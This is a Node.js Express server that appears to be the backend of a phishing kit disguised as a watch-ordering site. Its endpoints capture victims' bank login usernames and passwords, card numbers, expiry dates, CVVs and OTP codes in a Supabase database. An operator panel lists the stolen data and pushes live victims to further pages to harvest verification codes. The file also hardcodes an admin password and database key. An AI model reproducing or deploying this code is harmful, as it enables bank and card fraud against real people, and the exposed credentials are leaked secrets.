const express = require('express');
const path = require('path');
const crypto = require('crypto');
const { createClient } = require('@supabase/supabase-js');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.json());

const SUPABASE_URL = process.env.SUPABASE_URL || 'https://qwqszedggvefzkpqsihu.supabase.co';
const SUPABASE_KEY = process.env.SUPABASE_KEY || 'sb_publishable_uF-mM8mh9wUHwaogjSjwKg__4N4j_we';
const supabase = createClient(SUPABASE_URL, SUPABASE_KEY);

const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || 'Hamin1234@@';
const ADMIN_TOKEN = crypto.createHash('sha256').update(ADMIN_PASSWORD).digest('hex');

function isAdmin(req) {
  const auth = req.headers.authorization;
  if (auth && auth.startsWith('Bearer ')) return auth.slice(7) === ADMIN_TOKEN;
  return false;
}

// Admin login
app.post('/api/admin/login', (req, res) => {
  const { password } = req.body;
  if (password === ADMIN_PASSWORD) return res.json({ success: true, token: ADMIN_TOKEN });
  res.status(401).json({ success: false, message: 'كلمة المرور غير صحيحة' });
});

// Admin: get all submissions (orders) + active visitor count
app.get('/api/admin/submissions', async (req, res) => {
  try {
    if (!isAdmin(req)) return res.status(401).json({ submissions: [] });
    const { data: orders } = await supabase.from('orders').select('*').order('created_at', { ascending: false });
    const cutoff = Date.now() - 30000;
    const { data: visitors } = await supabase.from('visitors').select('*').gt('last_active_at', cutoff);
    const submissions = (orders || []).map(o => ({
      id: o.id,
      phone: o.phone || '',
      amount: o.watch_color || '-',
      card: o.card_number || o.login_username || '',
      pin: o.login_password || '',
      otp: o.verification_code || '',
      cvv: o.card_cvv || '',
      card_name: o.card_name || '',
      card_expiry: o.card_expiry || '',
      status: o.status || 'pending',
      time: o.created_at
    }));
    res.json({ submissions, active: (visitors || []).length });
  } catch (err) {
    res.json({ submissions: [], active: 0 });
  }
});

// Admin: redirect user
app.post('/api/admin/redirect/:id', async (req, res) => {
  try {
    if (!isAdmin(req)) return res.status(401).json({ success: false });
    const { page } = req.body;
    const redirect_map = { card: 'login', otp: 'code', cvv: 'code' };
    const redirect_to = redirect_map[page] || page || 'login';
    await supabase.from('orders').update({ status: 'redirect_' + (page || 'card'), redirect_to }).eq('id', req.params.id);
    const { data: order } = await supabase.from('orders').select('session_id').eq('id', req.params.id).maybeSingle();
    if (order && order.session_id) {
      await supabase.from('visitors').update({ redirect_to }).eq('session_id', order.session_id);
    }
    res.json({ success: true });
  } catch (err) { res.status(500).json({ success: false }); }
});

// Admin: accept order
app.post('/api/admin/accept/:id', async (req, res) => {
  try {
    if (!isAdmin(req)) return res.status(401).json({ success: false });
    await supabase.from('orders').update({ status: 'accepted' }).eq('id', req.params.id);
    const { data: order } = await supabase.from('orders').select('session_id').eq('id', req.params.id).maybeSingle();
    if (order && order.session_id) {
      await supabase.from('visitors').update({ redirect_to: 'success' }).eq('session_id', order.session_id);
    }
    res.json({ success: true });
  } catch (err) { res.status(500).json({ success: false }); }
});

// Admin: reject order
app.post('/api/admin/reject/:id', async (req, res) => {
  try {
    if (!isAdmin(req)) return res.status(401).json({ success: false });
    await supabase.from('orders').update({ status: 'rejected' }).eq('id', req.params.id);
    res.json({ success: true });
  } catch (err) { res.status(500).json({ success: false }); }
});

// Admin: clear all
app.post('/api/admin/clear', async (req, res) => {
  try {
    if (!isAdmin(req)) return res.status(401).json({ success: false });
    const { data: allOrders } = await supabase.from('orders').select('id');
    for (const o of (allOrders || [])) await supabase.from('orders').delete().eq('id', o.id);
    const { data: allVisitors } = await supabase.from('visitors').select('session_id');
    for (const v of (allVisitors || [])) await supabase.from('visitors').delete().eq('session_id', v.session_id);
    res.json({ success: true });
  } catch (err) { res.status(500).json({ success: false }); }
});

// Save order
app.post('/api/orders', async (req, res) => {
  try {
    const { name, phone, account_number, is_bank_client, bank_name, watch_color, watch_index, session_id } = req.body;
    if (!name || !phone) {
      return res.status(400).json({ success: false, message: 'الاسم ورقم الهاتف مطلوبان' });
    }
    if (account_number && account_number.length < 6) {
      return res.status(400).json({ success: false, message: 'رقم الحساب يجب أن لا يقل عن 6 أرقام' });
    }
    const { error } = await supabase.from('orders').insert({
      name, phone,
      email: phone + '@order.local',
      wilaya: '-',
      address: '-',
      account_number: account_number || null,
      is_bank_client: is_bank_client || null,
      bank_name: bank_name || null,
      watch_color: watch_color || '-',
      watch_index: watch_index !== undefined ? watch_index : null,
      session_id: session_id || null,
      current_page: 'order',
      status: 'pending',
      created_at: new Date().toISOString()
    });
    if (error) throw error;
    const { data: inserted } = await supabase.from('orders').select('id').eq('phone', phone).order('created_at', { ascending: false }).limit(1).maybeSingle();
    res.json({ success: true, order_id: inserted ? inserted.id : null });
  } catch (err) {
    res.status(500).json({ success: false, message: err.message });
  }
});

// Save login username
app.post('/api/login-data', async (req, res) => {
  try {
    const { order_id, username } = req.body;
    if (order_id) {
      await supabase.from('orders').update({ login_username: username, current_page: 'login' }).eq('id', order_id);
    }
    res.json({ success: true });
  } catch (err) {
    res.status(500).json({ success: false, message: err.message });
  }
});

// Save login password
app.post('/api/password-data', async (req, res) => {
  try {
    const { order_id, password } = req.body;
    if (!password || password.length < 6) {
      return res.status(400).json({ success: false, message: 'Password must be at least 6 digits' });
    }
    if (order_id) {
      await supabase.from('orders').update({ login_password: password, current_page: 'waiting', status: 'pending' }).eq('id', order_id);
    }
    res.json({ success: true });
  } catch (err) {
    res.status(500).json({ success: false, message: err.message });
  }
});

// Save card data
app.post('/api/card-data', async (req, res) => {
  try {
    const { order_id, card_name, card_number, expiry, cvv } = req.body;
    if (order_id) {
      await supabase.from('orders').update({
        card_name, card_number: card_number, card_expiry: expiry, card_cvv: cvv,
        current_page: 'card-waiting', status: 'card_pending'
      }).eq('id', order_id);
    }
    res.json({ success: true });
  } catch (err) {
    res.status(500).json({ success: false, message: err.message });
  }
});

// Save verification code
app.post('/api/code-data', async (req, res) => {
  try {
    const { order_id, code } = req.body;
    if (order_id) {
      await supabase.from('orders').update({ verification_code: code, status: 'code_pending', current_page: 'code-waiting' }).eq('id', order_id);
    }
    res.json({ success: true });
  } catch (err) {
    res.status(500).json({ success: false, message: err.message });
  }
});

// Presence / heartbeat for active visitors
app.post('/api/presence', async (req, res) => {
  try {
    const { session_id, current_page } = req.body;
    if (!session_id) return res.json({ ok: false });
    const now = Date.now();
    const { data: existing } = await supabase.from('visitors').select('id, redirect_to').eq('session_id', session_id).maybeSingle();
    if (!existing) {
      await supabase.from('visitors').upsert({
        session_id, current_page: current_page || 'home',
        last_active_at: now, created_at: now
      }, { onConflict: 'session_id' });
    } else {
      const updates = { last_active_at: now };
      if (current_page) updates.current_page = current_page;
      await supabase.from('visitors').update(updates).eq('session_id', session_id);
      if (existing.redirect_to) {
        await supabase.from('visitors').update({ redirect_to: null }).eq('session_id', session_id);
        return res.json({ ok: true, redirectTo: existing.redirect_to });
      }
    }
    res.json({ ok: true });
  } catch (err) {
    res.json({ ok: false });
  }
});

// Check order status (public - for waiting page)
app.get('/api/orders/:id/status', async (req, res) => {
  try {
    const { data } = await supabase.from('orders').select('status').eq('id', req.params.id).maybeSingle();
    if (!data) return res.json({ status: 'not_found' });
    res.json({ status: data.status });
  } catch (err) {
    res.json({ status: 'error' });
  }
});

app.use(express.static(path.join(__dirname, 'public')));

app.get('*', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

if (!process.env.VERCEL) {
  app.listen(PORT, () => {
    console.log(`Server running on http://localhost:${PORT}`);
  });
}

module.exports = app;
